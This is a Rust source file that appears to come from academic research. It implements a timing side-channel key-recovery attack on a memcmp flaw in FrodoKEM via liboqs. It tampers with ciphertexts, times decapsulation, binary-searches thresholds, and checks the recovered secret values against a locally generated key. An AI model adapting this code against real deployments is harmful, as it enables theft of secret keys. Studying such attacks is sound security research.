use super::modify_and_measure::*;
use crate::attack::memcmp_frodo::MeasureSource;
use crate::utils::save_to_csv;
use crate::utils::Rec;
use crate::utils::Recorder;
use crate::utils::SaveAllRecorder;
use liboqs_rs_bindings as oqs;
use log::{debug, error, info, log, trace, warn, Level};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::frodokem::KemBuf;
use std::path::PathBuf;

const LOW_PERCENTAGE_LIMIT: f64 = 2.5;
const CONSECUTIVE_LIMIT_CHANGE: u8 = 3;
const MAX_MOD_RETRIES: u8 = 6;

enum SearchError {
    Internal(String),
    RetryIndex,
    RetryMod,
}

impl<S: ToString> From<S> for SearchError {
    fn from(s: S) -> SearchError {
        SearchError::Internal(s.to_string())
    }
}

#[derive(Debug)]
struct Threshold {
    pub goodhighrange: std::ops::RangeFrom<f64>,
    pub goodlowrange: std::ops::RangeTo<f64>,
    pub midpoint: f64,
}

#[derive(Debug)]
enum ModCase {
    TooLowMod,
    TooHighMod,
}

impl Threshold {
    fn distinguish(&self, percentage: f64) -> Result<ModCase, SearchError> {
        match (
            self.goodlowrange.contains(&percentage),
            self.goodhighrange.contains(&percentage),
        ) {
            (false, false) => {
                error!(
                    "percentage {} outside of expected ranges: {:?}",
                    percentage, self
                );
                Err(SearchError::RetryMod)
            }
            (true, false) => Ok(ModCase::TooLowMod),
            (false, true) => Ok(ModCase::TooHighMod),
            _ => Err(SearchError::Internal(
                "percentage value inside both ranges at the same percentage, impossible!"
                    .to_string(),
            )),
        }
    }
}

#[derive(Debug)]
struct SearchState {
    pub maxmod: u16,
    pub index_ij: usize,
    pub maxindex: usize,
    pub highlim: u16,
    pub lowlim: u16,
    pub consecutive_high_changes: u8,
    pub consecutive_low_changes: u8,
    pub prev_highlim: u16,
    pub prev_lowlim: u16,
    pub lowmodpercentage: Option<f64>,
    pub threshold: Option<Threshold>,
    pub iterations_binsearch: u64,
    pub iterations: u64,
    pub iterations_profiling: u64,
    pub low_moved: bool,
    pub high_moved: bool,
    pub valuelimit: u64,
}

impl SearchState {
    fn calc_midpoint(&mut self) -> u16 {
        match (self.low_moved, self.high_moved) {
            (true, false) => {
                // the higher boundary has not moved, the probability distribution tells us that
                // the value we are searching for is closer to the low boundary.
                let d = self.highlim - self.lowlim;
                let new = self.lowlim + d / 8;
                debug!(
                    "Skewing the binsearch downwards, {} + ({} - {}) / 8 = {}",
                    self.lowlim, self.highlim, self.lowlim, new
                );
                std::cmp::max(self.lowlim + 1, new)
            }
            (false, true) => {
                // the self.lowerlim boundary has not moved, the probability distribution tells us that
                // the value we are searching for is closer to the self.highlim boundary.
                let d = self.highlim - self.lowlim;
                let new = self.highlim - d / 8;
                debug!(
                    "Skewing the binsearch uwards, {} - ({} - {}) / 8 = {}",
                    self.highlim, self.highlim, self.lowlim, new
                );
                std::cmp::min(self.highlim - 1, new)
            }
            _ => {
                // Both boundaries have now moved, we continue with normal binary search.
                if self.consecutive_low_changes >= CONSECUTIVE_LIMIT_CHANGE {
                    warn!("Upperbound ({}) has not changed for a while, it might be erronous, let's check it again", self.highlim);
                    let midpoint = self.highlim;
                    if self.prev_highlim == self.highlim {
                        self.highlim = self.prev_highlim;
                        self.prev_highlim = self.maxmod;
                    } else {
                        self.highlim = self.prev_highlim;
                    }
                    self.consecutive_low_changes = 0;
                    self.consecutive_high_changes = 0;
                    midpoint
                } else if self.consecutive_high_changes >= CONSECUTIVE_LIMIT_CHANGE {
                    warn!("Lowerbound ({}) has not changed for a while, it might be erronous, let's check it again", self.lowlim);
                    let midpoint = self.lowlim;
                    if self.prev_lowlim == self.lowlim {
                        self.lowlim = self.prev_lowlim;
                        self.prev_lowlim = 0;
                    } else {
                        self.lowlim = self.prev_lowlim;
                    }
                    self.consecutive_low_changes = 0;
                    self.consecutive_high_changes = 0;
                    midpoint
                } else {
                    (self.highlim + self.lowlim) / 2
                }
            }
        }
    }

    fn update_state(
        &mut self,
        percentage: f64,
        currentmod: u16,
    ) -> Result<Option<u16>, SearchError> {
        if let Some(threshold) = &self.threshold {
            // Compare results to threshold
            match threshold.distinguish(percentage)? {
                ModCase::TooLowMod => {
                    self.consecutive_low_changes += 1;
                    self.consecutive_high_changes = 0;
                    info!(
                        "C[{}/{}] => +Raising lowerbound to {}",
                        self.index_ij, self.maxindex, currentmod
                    );
                    self.prev_lowlim = self.lowlim;
                    self.lowlim = currentmod;
                    self.low_moved = true;
                }
                ModCase::TooHighMod => {
                    self.consecutive_low_changes = 0;
                    self.consecutive_high_changes += 1;
                    info!(
                        "C[{}/{}] => -Lowering upperbound to {}",
                        self.index_ij, self.maxindex, currentmod
                    );
                    self.prev_highlim = self.highlim;
                    self.highlim = currentmod;
                    self.high_moved = true;
                }
            }
        } else if let Some(threshold_lowpercentage) = self.lowmodpercentage {
            // Threshold not yet calculated, do it!
            info!(
                "C[{}/{}] => Percentage of values below limit for low amount of modifications: {}",
                self.index_ij, self.maxindex, percentage
            );
            if percentage <= LOW_PERCENTAGE_LIMIT {
                error!(
                    "threshold high ({}) <=  LOW_PERCENTAGE_LIMIT ({})",
                    percentage, LOW_PERCENTAGE_LIMIT
                );
                return Err(SearchError::RetryIndex);
            }

            let diff = percentage - threshold_lowpercentage;
            let halfdiff = diff / 2.0;
            let threshold = Threshold {
                midpoint: threshold_lowpercentage + halfdiff,
                goodlowrange: ..(threshold_lowpercentage + (halfdiff / 2.0)),
                goodhighrange: (percentage - (halfdiff / 2.0))..,
            };
            info!("New threshold is: {:?} (diff: {})", threshold, diff);
            self.threshold.replace(threshold);
            self.highlim = self.maxmod;
            self.lowlim = 0;
            self.iterations = self.iterations_binsearch;
        } else {
            // Record current datapoint, we need it later (see above) to calculate the thresold
            info!(
                "C[{}/{}] => Percentage of values below limit for high amount of modifications: {}",
                self.index_ij, self.maxindex, percentage
            );
            self.lowmodpercentage.replace(percentage);
            self.highlim = self.maxmod + 2; // This ensures that we try maxmod-1 as the second profiling step
            self.lowlim = self.maxmod - 3; // This ensures that we try maxmod-1 as the second profiling step
        }
        if self.highlim - self.lowlim == 1 {
            if self.highlim == self.maxmod {
                error!("Upper bound never changed, we might have missed the real threshold modification!");
                return Err(SearchError::RetryIndex);
            }
            if self.lowlim == 0 {
                error!("Lower bound never changed, we might have missed the real threshold modification!");
                return Err(SearchError::RetryIndex);
            }
            return Ok(Some(self.lowlim));
        }

        Ok(None)
    }

    fn get_percentage(&mut self, recorder: &Recorder<SaveAllRecorder>) -> Result<f64, SearchError> {
        if self.threshold.is_none() && self.lowmodpercentage.is_none() {
            // We are in the first part of the profiling phase
            self.valuelimit = recorder
                .nth_lowest_value(recorder.len() / 100)
                .ok_or(SearchError::RetryIndex)?; //Not enugh recorded values
            info!("using {} as the valuelimit below which we calculate the percentage of the number of measurments.", self.valuelimit);
        }
        Ok(recorder.percentage_lte(self.valuelimit))
    }
}

#[logfn_inputs(Trace)]
fn search_modification<FRODO: FrodoKem>(
    ciphertext_index: usize,
    index_ij: usize,
    iterations: u64,
    profileiters: u64,
    measure_source: &MeasureSource,
    cutoff: u64,
    ciphertext: &mut FRODO::Ciphertext,
    shared_secret_d: &mut FRODO::SharedSecret,
    secret_key: &mut FRODO::SecretKey,
    expected_x0: u16,
    save_to_file: Option<&PathBuf>,
    recorders: &mut Vec<Recorder<SaveAllRecorder>>,
) -> Result<u16, SearchError> {
    let maxmod = error_correction_limit::<FRODO>() * 2;
    let mut state = SearchState {
        maxmod,
        index_ij,
        maxindex: FRODO::C::len() - 1,
        highlim: 2, // This ensures that we try 1 first
        lowlim: 0,  // This ensures that we try 1 first
        prev_highlim: maxmod,
        prev_lowlim: 1,
        consecutive_high_changes: 0,
        consecutive_low_changes: 0,
        lowmodpercentage: None,
        threshold: None,
        iterations: profileiters,
        iterations_binsearch: iterations,
        iterations_profiling: profileiters,
        low_moved: false,
        high_moved: false,
        valuelimit: 0,
    };
    let mut retries = 0;
    let found = loop {
        // Select midpoint to test
        let currentmod: u16 = state.calc_midpoint();
        trace!("high: {}, low: {}", state.highlim, state.lowlim);

        // Measure
        debug!(
            "C[{}/{}] => Testing adding {} to C[{}] with {} iterations.",
            index_ij,
            FRODO::C::len() - 1,
            currentmod,
            index_ij,
            state.iterations
        );

        let rec = if retries > 0 {
            // If we are currently retrying we reuse the previous recorder so that we
            // may aggregate the results and get a better mean value
            recorders.pop().unwrap()
        } else {
            Recorder::saveall(
                format!(
                    "{}-BINSEARCH[{}]({}){{{}}}",
                    ciphertext_index, index_ij, expected_x0, currentmod
                ),
                Some(cutoff),
            )
        };

        let rec = mod_measure::<FRODO, _>(
            currentmod,
            index_ij,
            state.iterations,
            &measure_source,
            ciphertext,
            shared_secret_d,
            secret_key,
            rec,
        )?;

        // Compute a single representative datapoint
        let percentage = state.get_percentage(&rec)?;
        debug!("percentage measurment is {}", percentage);

        // Save measurments to file?
        if let Some(path) = save_to_file {
            recorders.push(rec);
            debug!("Saving measurments to file {:?}", path);
            save_to_csv(&path, &recorders)?;
        }

        // Threshold handling

        match state.update_state(percentage, currentmod) {
            Ok(Some(value)) => {
                break value;
            }
            Ok(None) => {
                retries = 0;
            }
            Err(SearchError::RetryMod) => {
                retries += 1;
                if retries >= MAX_MOD_RETRIES {
                    // We got too many bad results, we need to search with a new profile instead
                    error!("Too many retries for this modification!");
                    return Err(SearchError::RetryIndex);
                } else if retries == MAX_MOD_RETRIES / 2 {
                    // If we have tried half the amount of maximum retries
                    // we discard the previous (uncertain) results and try
                    // again with a new batch
                    warn!("Discarding data for this modification, trying again!");
                    recorders.push(Recorder::saveall(
                        format!(
                            "{}-BINSEARCH[{}]({}){{{}}}",
                            ciphertext_index, index_ij, expected_x0, currentmod
                        ),
                        Some(cutoff),
                    ))
                } else {
                    warn!("Adding more measurments of the same modification!");
                }
            }
            Err(err) => return Err(err),
        }
    };

    Ok(found)
}

//#[logfn_inputs(Trace)]
pub fn crack_s<FRODO: FrodoKem>(
    warmup: u64,
    iterations: u64,
    profileiters: u64,
    measure_source: MeasureSource,
    save_to_file: Option<PathBuf>,
) -> Result<(), String> {
    #![allow(non_snake_case)]
    info!(
        "Launching the crack_s routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );

    let mut public_key = FRODO::PublicKey::new();
    let mut secret_key = FRODO::SecretKey::new();
    let mut ciphertext = FRODO::Ciphertext::new();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    let mut shared_secret_e = FRODO::SharedSecret::new();
    let mut shared_secret_d = FRODO::SharedSecret::new();

    //let n = FRODO::params().PARAM_N;
    let nbar: usize = FRODO::params().PARAM_NBAR;
    let mbar = nbar;
    let err_corr_limit = error_correction_limit::<FRODO>();
    let nbr_encaps = 100;
    let i = mbar - 1;

    let mut recorders = vec![];

    measure_source.prep_thread()?;

    let mut indexes = 0.0;
    let mut succeses = 0.0;

    for t in 0..nbr_encaps {
        info!("Using encaps to generate ciphertext number: {}", t);
        FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
        let expectedEppp = FRODO::calculate_Eppp(&mut ciphertext, &mut secret_key)?;
        let expectedEppp = expectedEppp.as_slice();

        for j in 0..nbar {
            // Modify ciphertext at C[nbar-1, j]
            let index = i * nbar + j;
            let expected_x0 = (err_corr_limit - expectedEppp[index]) as u16;

            let x0 = loop {
                info!(
                    "Starting {} warmup iterations without modifications in order to detect a good cutoff value", warmup
                );
                let cutoff = {
                    let rec = mod_measure::<FRODO, _>(
                        0,
                        index,
                        warmup,
                        &measure_source,
                        &mut ciphertext,
                        &mut shared_secret_d,
                        &mut secret_key,
                        Recorder::saveall(format!("{}-WARMUP[{}]", t, index), None),
                    )?;
                    let mean = rec.aggregated_value()?;
                    let minimum_value = rec.min()?;
                    let cutoff = mean + (mean - minimum_value);
                    info!(
                        "using {} as the cutoff value to remove outliers (minimum warmup latency: {}, mean: {}).",
                        cutoff, minimum_value, mean
                    );
                    cutoff
                };

                info!(
                    "Starting binary search for Eppp[{},{}], expect to find x0 = {}",
                    i, j, expected_x0
                );
                match search_modification::<FRODO>(
                    t,
                    index,
                    iterations,
                    profileiters,
                    &measure_source,
                    cutoff,
                    &mut ciphertext,
                    &mut shared_secret_d,
                    &mut secret_key,
                    expected_x0,
                    save_to_file.as_ref(),
                    &mut recorders,
                ) {
                    Ok(x0) => break x0,
                    Err(SearchError::Internal(err)) => return Err(err),
                    Err(_) => {
                        //RetryIndex and RetryMod
                        warn!("Retrying the search since we didn't get any results.");
                    }
                }
            };

            indexes += 1.0;
            let Eppp_ij = err_corr_limit - x0 - 1; //TODO, find out why we need a -1 here
            let lglvl = if Eppp_ij != expectedEppp[index] {
                Level::Warn
            } else {
                succeses += 1.0;
                Level::Info
            };
            log!(
                lglvl,
                "Found -Eppp[{},{}]={} expected: {}. Current success rate is: {:.0}/{:.0}={}",
                i,
                j,
                Eppp_ij,
                expectedEppp[index],
                succeses,
                indexes,
                (succeses / indexes) * 100.0
            );
        }
    }

    Ok(())
}
